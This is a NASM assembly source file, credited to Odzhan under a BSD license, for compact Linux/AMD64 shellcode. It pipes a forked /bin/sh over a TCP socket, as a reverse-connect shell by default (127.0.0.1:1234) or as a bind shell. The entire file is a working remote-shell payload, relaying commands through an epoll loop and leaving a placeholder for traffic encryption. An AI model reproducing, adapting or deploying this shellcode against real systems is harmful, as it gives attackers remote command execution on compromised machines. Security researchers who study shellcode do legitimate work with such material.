;
;  Copyright © 2018 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  
; -----------------------------------------------
; Synchronous shell for Linux/AMD64
;
; 347 bytes for reverse connect
; 366 bytes for bind
;
; -----------------------------------------------

      %define AMD64
      %include "include.inc"
 
      %ifndef BIN
        global start
        global _start
      %endif
      
      %define PORT 1234
      %define HOST 0x0100007f ; 127.0.0.1
    
start:
_start:
      push    rbp
      push    rbx
      push    rsi
      push    rdi
      
      xor     eax, eax
      cdq
      mov     al, ds_tbl_size
      sub     rsp, rax
      push    rsp
      pop     rbp
      ; create 2 read/write pipes
      push    rbp
      pop     rdi   
      
      ; pipe(in);
      mov     al, SYS_pipe    
      syscall
      scasq
      
      ; pipe(out);
      mov     al, SYS_pipe
      syscall   
      
      ; pid = fork();
      mov     al, SYS_fork
      syscall    
      mov     [rbp+@pid], eax ; save pid
      test    eax, eax        ; already forked?
      jnz     opn_con         ; open connection
      
      ; in this order..
      ;
      ; dup2 (out[1], STDERR_FILENO)      
      ; dup2 (out[1], STDOUT_FILENO)
      ; dup2 (in[0],  STDIN_FILENO )   
      push    STDERR_FILENO
      pop     rsi
      mov     edi, [rbp+@out1]      ; edi = out[1]
c_dup:
      mov     al, SYS_dup2       
      syscall
      dec     rsi 
      cmovz   edi, [rbp+@in0]       ; replace stdin with in[0]  
      jns     c_dup  
  
      ; close pipe handles in this order..
      ;
      ; close(in[0]);
      ; close(in[1]);
      ; close(out[0]);
      ; close(out[1]);
      push    rbp               ; rsi = p_in and p_out
      pop     rsi
      mov     dl, 4     
cls_pipe:
      lodsd                    ; eax = pipes[i]
      xchg    eax, edi   
      push    SYS_close
      pop     rax 
      syscall
      dec     dl
      jnz     cls_pipe      
      
      ; execve("/bin//sh", 0, 0);
      xor     esi, esi
      push    rdx
      pop     rsi              ; rsi=0
      push    rdx              ; zero terminator
      mov     rcx, '/bin//sh'
      push    rcx
      push    rsp
      pop     rdi    
      mov     al, SYS_execve
      syscall
opn_con:    
      ; close(in[0]);
      push    SYS_close
      pop     rax
      mov     edi, [rbp+@in0]    
      syscall    

      ; close(out[1]);
      mov     al, SYS_close     
      mov     edi, [rbp+@out1]    
      syscall   
      
      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
      push    SYS_socket
      pop     rax
      push    SOCK_STREAM
      pop     rsi
      push    AF_INET
      pop     rdi    
      syscall 
      mov     [rbp+@s], eax    ; save socket
      
      %ifdef BIND         
        mov     edx, ((htons(PORT) << 16) | AF_INET)
      %else
        mov     rdx, (HOST << 32) | ((htons(PORT) << 16) | AF_INET)
      %endif
      
      push    rdx
      push    16                ; sizeof(sa)  
      pop     rdx
      push    rsp               ; &sa
      pop     rsi
      xchg    eax, edi          ; edi = s
%ifndef BIND  
      ; connect (s, &sa, sizeof(sa)); 
      push    SYS_connect
      pop     rax
      syscall    
      test    eax, eax
      pop     rcx
      jl      cls_sck
%else
      ; bind (s, &sa, sizeof(sa));   
      push    SYS_bind
      pop     rax 
      syscall
      test    eax, eax
      pop     rcx
      jl      cls_sck

      ; listen (s, 0);
      xor     esi, esi
      mov     al, SYS_listen
      syscall

      ; accept (s, 0, 0);
      cdq
      mov     al, SYS_accept
      syscall
      xchg    dword[rbp+@s ], eax       ; swap with s
      mov     dword[rbp+@s2], eax       ; save as s2
%endif      
      ; efd = epoll_create1(0);
      xor     edi, edi          ; sets CF=0
      push    SYS_epoll_create1
      pop     rax
      syscall
      mov     dword[rbp+@efd], eax                    ; save efd
      
      xchg    eax, edi          ; edi = efd
      mov     eax, [rbp+@s]       
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
      lea     r10, [rbp+@evts]
      mov     dword[r10+events], EPOLLIN
      mov     dword[r10+data  ], eax ; evts.data.fd = i==0 ? s : out[0]
      xchg    eax, edx
      mov     al, SYS_epoll_ctl    
      push    EPOLL_CTL_ADD
      pop     rsi
      syscall
      mov     eax, [rbp+@out0]
      cmp     edx, eax  ; do out[0] in 2nd loop
      jnz     poll_init      
      ; now loop until user exits or some other error      
poll_wait:
      ; epoll_wait(efd, &evts, 1, -1);
      push    SYS_epoll_wait
      pop     rax
      mov     r10d, -1          ; no timeout
      push    1                 ; edx = 1 event 
      pop     rdx
      lea     rsi, [rbp+@evts]
      mov     edi, [rbp+@efd]
      syscall
      
      ; if (r <= 0) break;
      test    eax, eax
      jle     cls_efd
      
      ; EPOLLHUP would indicate /bin/sh terminated
      lodsd                    ; eax = evt.events
      ; if (!(evts.events & EPOLLIN)) break;
      dec     eax               ; test   al, EPOLLIN
      jnz     cls_efd

      lodsd                    ; eax = evt.data.fd       
      ; r=(fd==s)?s:out[0];
      ; w=(fd==s)?in[1]:s;
      xchg    edi, eax          ; ebx = evt.data.fd
      cmp     edi, [rbp+@s]     ; if socket event
      cmove   eax, [rbp+@in1]   ; write to in[1]
      cmovne  eax, [rbp+@s]     ; else read from out[0], write to s
      push    rax
      
      ; read(r, buf, BUFSIZ);
      cdq                       ; rdx = BUFSIZ
      mov     dl, BUFSIZ
      lea     rsi, [rbp+@buf]   ; rsi = buf
      xor     eax, eax          ; rax = SYS_read
      syscall
      
      ; nothing read? bail out
      test    eax, eax
      jz      cls_efd
      
      ; encrypt/decrypt buffer
      
      ; write(w, buf, len);
      xchg    eax, edx          ; edx = len
      pop     rdi               ; s or in[1]
      mov     al, SYS_write
      syscall
      jmp     poll_wait
cls_efd:   
      ; epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
      xor     r10, r10            ; NULL
      mov     edx, [rbp+@s]       ; s
      push    EPOLL_CTL_DEL       
      pop     rsi
      mov     edi, [rbp+@efd]     ; efd
      push    SYS_epoll_ctl       ; epoll_ctl
      pop     rax
      syscall
    
      ; epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
      mov     edx, [rbp+@out0]    ; out[0]
      mov     al, SYS_epoll_ctl   ; epoll_ctl
      syscall 
      
      ; close(efd);
      mov     al, SYS_close
      syscall
    
      ; shutdown socket
      ; shutdown(s, SHUT_RDWR);
      mov     al, SYS_shutdown
      mov     edi, [rbp+@s]
      push    SHUT_RDWR
      pop     rsi
      syscall
cls_sck:
      ; close(s);
      push    SYS_close
      pop     rax   
      mov     edi, [rbp+@s]
      syscall 
    
%ifdef BIND
      ; close(s1);
      mov     al, SYS_close
      mov     edi, [rbp+@s2]
      syscall
%endif            
      ; terminate /bin/sh
      ; kill(pid, SIGCHLD);
      mov     al, SYS_kill
      push    SIGCHLD
      pop     rsi
      mov     edi, [rbp+@pid]
      syscall

      ; close(in[1]);
      mov     al, SYS_close    
      mov     edi, [rbp+@in1]
      syscall   

      ; close(out[0]);
      mov     al, SYS_close    
      mov     edi, [rbp+@out0]
      syscall 
    
      ; only include exit system call
      ; if compiled as ELF
%ifndef BIN
      ; exit(0);
      mov     al, SYS_exit
      syscall
%else
      ; release memory
      add     rsp, ds_tbl_size
      ; restore registers
      pop     rdi
      pop     rsi
      pop     rbx
      pop     rbp
      ret
%endif
      
